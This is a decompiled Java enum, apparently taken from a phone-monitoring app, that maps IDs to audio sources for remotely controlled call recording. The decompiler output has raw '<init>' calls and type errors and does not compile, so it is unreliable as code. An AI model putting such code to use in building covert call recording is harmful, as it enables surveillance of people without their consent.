package com.vvt.remotecontrol.input;

import java.util.HashMap;
import java.util.Map;

public enum RmtCtrlInputCallRecordingAudioSource$AudioSource
{
  private static final Map a;
  private final int mId;
  private final String mName;
  
  static
  {
    int i = 3;
    int j = 2;
    int k = 4;
    int m = 1;
    int n = 0;
    Object localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource$AudioSource;
    ((AudioSource)localObject1).<init>("MICROPHONE", 0, m, "Microphone");
    MICROPHONE = (AudioSource)localObject1;
    localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource$AudioSource;
    String str = "Voice Call";
    ((AudioSource)localObject1).<init>("VOICE_CALL", m, k, str);
    VOICE_CALL = (AudioSource)localObject1;
    localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource$AudioSource;
    ((AudioSource)localObject1).<init>("AOSP", j, 6, "AOSP");
    AOSP = (AudioSource)localObject1;
    localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource$AudioSource;
    ((AudioSource)localObject1).<init>("MEDIA_RECORDING", i, 7, "Legacy");
    MEDIA_RECORDING = (AudioSource)localObject1;
    localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource$AudioSource;
    int i1 = 100;
    Object localObject2 = "ALSA";
    ((AudioSource)localObject1).<init>("ALSA", k, i1, (String)localObject2);
    ALSA = (AudioSource)localObject1;
    int i2 = 5;
    localObject1 = new AudioSource[i2];
    AudioSource localAudioSource = MICROPHONE;
    localObject1[0] = localAudioSource;
    localAudioSource = VOICE_CALL;
    localObject1[m] = localAudioSource;
    localAudioSource = AOSP;
    localObject1[j] = localAudioSource;
    localAudioSource = MEDIA_RECORDING;
    localObject1[i] = localAudioSource;
    localAudioSource = ALSA;
    localObject1[k] = localAudioSource;
    b = (AudioSource[])localObject1;
    localObject1 = new java/util/HashMap;
    ((HashMap)localObject1).<init>();
    a = (Map)localObject1;
    localObject1 = values();
    int i3 = localObject1.length;
    while (n < i3)
    {
      str = localObject1[n];
      localObject2 = a;
      m = str.mId;
      Integer localInteger = Integer.valueOf(m);
      ((Map)localObject2).put(localInteger, str);
      n += 1;
    }
  }
  
  private RmtCtrlInputCallRecordingAudioSource$AudioSource(int paramInt1, String paramString1)
  {
    this.mId = paramInt1;
    this.mName = paramString1;
  }
  
  public static AudioSource forValue(int paramInt)
  {
    Map localMap = a;
    Integer localInteger = Integer.valueOf(paramInt);
    return (AudioSource)localMap.get(localInteger);
  }
  
  public int getId()
  {
    return this.mId;
  }
  
  public String getName()
  {
    return this.mName;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource$AudioSource.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */